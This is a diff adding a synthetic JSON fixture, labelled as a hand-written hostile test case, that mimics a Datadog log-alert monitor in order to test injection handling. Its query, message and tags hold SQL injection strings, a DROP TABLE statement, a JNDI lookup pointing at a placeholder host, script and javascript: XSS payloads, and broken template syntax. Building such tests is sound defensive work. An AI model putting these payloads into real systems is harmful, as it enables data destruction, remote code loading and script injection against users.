@@ -1,0 +1,22 @@
+{
+ "_synthetic": "SYNTHETIC: hand-written hostile test case, not a Datadog export (monitor_template_injection)",
+ "name": "SYNTHETIC template and query injection",
+ "type": "log alert",
+ "query": "logs(\"service:web @msg:\\\"a' OR 1=1 --\\\" \\\\ \").index(\"*\").rollup(\"count\").by(\"@host\").last(\"5m\") > 0",
+ "message": "{{#is_alert}}unclosed {{{triple}} {{ ^is_warning}} {{#is_match \"host.name\" \"a\\\"b\"}} | md | table | `${jndi:ldap://x.invalid/a}` <script>alert(1)</script> [link](javascript:alert(1)) {{/is_recovery}}",
+ "tags": [
+  "a:b' OR '1'='1",
+  "x\"; DROP TABLE y;--",
+  "k:${env.HOME}"
+ ],
+ "options": {
+  "thresholds": {
+   "critical": 0
+  },
+  "aggregation": {
+   "type": "count",
+   "metric": "count",
+   "groupBy": "@host"
+  }
+ }
+}
